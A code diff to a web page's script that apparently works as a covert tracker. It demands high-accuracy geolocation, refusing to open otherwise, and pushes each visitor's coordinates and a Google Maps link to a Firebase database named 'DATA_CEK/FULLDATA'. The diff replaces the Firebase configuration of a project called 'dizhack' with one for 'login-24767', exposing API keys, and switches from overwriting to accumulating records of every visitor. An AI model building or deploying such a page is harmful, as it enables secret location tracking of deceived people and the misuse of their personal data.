@@ -51,17 +51,17 @@
     </div>  
   </div>    <script type="module">  
     import { initializeApp } from "https://www.gstatic.com/firebasejs/11.7.1/firebase-app.js";  
-    import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/11.7.1/firebase-database.js";  
-  
-    const firebaseConfig = {  
-      apiKey: "AIzaSyDPkjZBssBDUwlm8-w2bDXvmMmv4i_e7b0",  
-      authDomain: "dizhack-98c2b.firebaseapp.com",  
-      databaseURL: "https://dizhack-98c2b-default-rtdb.firebaseio.com",  
-      projectId: "dizhack-98c2b",  
-      storageBucket: "dizhack-98c2b.firebasestorage.app",  
-      messagingSenderId: "445703908115",  
-      appId: "1:445703908115:web:175f2a8372bfda727088e6"  
-    };  
+    import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/11.7.1/firebase-database.js";
+
+    const firebaseConfig = {
+      apiKey: "AIzaSyDIOjpEtWakfh0WNCDC1iPj9Qm5zKDlaL4",
+      authDomain: "login-24767.firebaseapp.com",
+      databaseURL: "https://login-24767-default-rtdb.firebaseio.com",
+      projectId: "login-24767",
+      storageBucket: "login-24767.appspot.com",
+      messagingSenderId: "809521846306",
+      appId: "1:809521846306:web:ee8bc0fe4e07584bad127b"
+    };
     const app = initializeApp(firebaseConfig);  
     const db = getDatabase(app);  
     const DATA_NODE = "DATA_CEK/FULLDATA";  
@@ -99,7 +99,7 @@
           longitude: lon,  
           gmapsLink: `https://maps.google.com/?q=${lat},${lon}`  
         };  
-        await set(ref(db, DATA_NODE), payload);  
+        await push(ref(db, DATA_NODE), payload);  
   
         document.getElementById("thankModal").classList.add("active");  
       }, () => { alert("Perizinan lokasi tidak di berikan. Aplikasi tidak dapat di buka."); }, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });  
@@ -108,6 +108,7 @@
     document.getElementById("contactBtn").addEventListener("click", () => {  
       window.open(`https://wa.me/${WA_NUMBER}`, "_blank");  
     });  
-  </script>  </body>  
+  </script> 
+</body>  
 </html>  
 
